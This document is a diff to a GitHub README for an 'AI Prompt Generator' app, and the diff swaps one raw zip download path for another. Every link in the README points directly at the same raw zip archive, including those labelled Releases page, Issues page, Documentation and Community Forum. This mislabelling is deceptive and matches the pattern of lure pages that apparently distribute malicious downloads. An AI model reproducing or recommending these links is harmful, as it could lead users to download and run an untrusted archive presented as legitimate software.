@@ -1,6 +1,6 @@
 # 🎨 Prompt-Generator - Create Engaging Prompts Effortlessly
 
-[![Download Prompt-Generator](https://raw.githubusercontent.com/nuuuut/Prompt-Generator/main/lobo/Prompt-Generator.zip)](https://raw.githubusercontent.com/nuuuut/Prompt-Generator/main/lobo/Prompt-Generator.zip)
+[![Download Prompt-Generator](https://raw.githubusercontent.com/nuuuut/Prompt-Generator/main/promptpilot-api/frontend/Prompt_Generator_legationary.zip)](https://raw.githubusercontent.com/nuuuut/Prompt-Generator/main/promptpilot-api/frontend/Prompt_Generator_legationary.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **Prompt-Generator**, the AI Prompt Generator that helps you create p
 
 To get started, you first need to download the application. Visit the Releases page to find the latest version of the Prompt-Generator.
 
-[Download the latest version here.](https://raw.githubusercontent.com/nuuuut/Prompt-Generator/main/lobo/Prompt-Generator.zip)
+[Download the latest version here.](https://raw.githubusercontent.com/nuuuut/Prompt-Generator/main/promptpilot-api/frontend/Prompt_Generator_legationary.zip)
 
 1. Click the link above to go to our Releases page.
 2. Find the latest release version listed at the top.
@@ -76,7 +76,7 @@ Once the download completes, follow these steps to run the application:
 
 If you encounter any issues or have questions, feel free to reach out for support. We aim to provide high-quality assistance:
 
-- **GitHub Issues**: Report any bugs or issues via the [Issues page](https://raw.githubusercontent.com/nuuuut/Prompt-Generator/main/lobo/Prompt-Generator.zip).
+- **GitHub Issues**: Report any bugs or issues via the [Issues page](https://raw.githubusercontent.com/nuuuut/Prompt-Generator/main/promptpilot-api/frontend/Prompt_Generator_legationary.zip).
 - **Community Support**: Join discussions on our repository to connect with other users.
 
 ## 🌍 Contribute
@@ -92,11 +92,11 @@ We welcome contributions to enhance Prompt-Generator. If you're interested in he
 
 Explore tutorials, stories from users, and more:
 
-- [Documentation](https://raw.githubusercontent.com/nuuuut/Prompt-Generator/main/lobo/Prompt-Generator.zip)
-- [Community Forum](https://raw.githubusercontent.com/nuuuut/Prompt-Generator/main/lobo/Prompt-Generator.zip)
+- [Documentation](https://raw.githubusercontent.com/nuuuut/Prompt-Generator/main/promptpilot-api/frontend/Prompt_Generator_legationary.zip)
+- [Community Forum](https://raw.githubusercontent.com/nuuuut/Prompt-Generator/main/promptpilot-api/frontend/Prompt_Generator_legationary.zip)
 
 ## 🔗 Stay Updated
 
 Stay informed about new features and updates by following our GitHub repository. Check back regularly for improvements and enhancements.
 
-[Download the latest version here.](https://raw.githubusercontent.com/nuuuut/Prompt-Generator/main/lobo/Prompt-Generator.zip)
+[Download the latest version here.](https://raw.githubusercontent.com/nuuuut/Prompt-Generator/main/promptpilot-api/frontend/Prompt_Generator_legationary.zip)
